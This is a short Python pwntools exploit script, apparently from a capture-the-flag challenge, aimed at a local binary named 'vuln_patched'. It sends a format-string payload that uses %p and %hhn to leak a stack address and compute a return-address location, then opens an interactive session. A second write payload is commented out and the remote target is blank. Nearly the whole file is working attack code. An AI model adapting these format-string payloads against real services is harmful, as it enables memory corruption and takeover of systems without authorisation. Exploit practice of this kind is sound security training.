#!/usr/bin/env python3
from pwn import *
exe = ELF('vuln_patched', checksec = False)
libc = ELF("./libc.so.6", checksec = False)

p = process(exe.path, aslr=False)
# p = remote('', )

input()


p.sendafter(b"Choice: ", b"s %82p%56$hhn")
p.recvuntil(b"0x")
ret = int(p.recv(12), 16) + 0x1a8
print(hex(ret))

p.sendlineafter(b'Choice: ', b'book')

# payload = f's %{0x8}c%11$hhn'.encode()
# p.sendlineafter(b'Choice: ', payload)


p.interactive()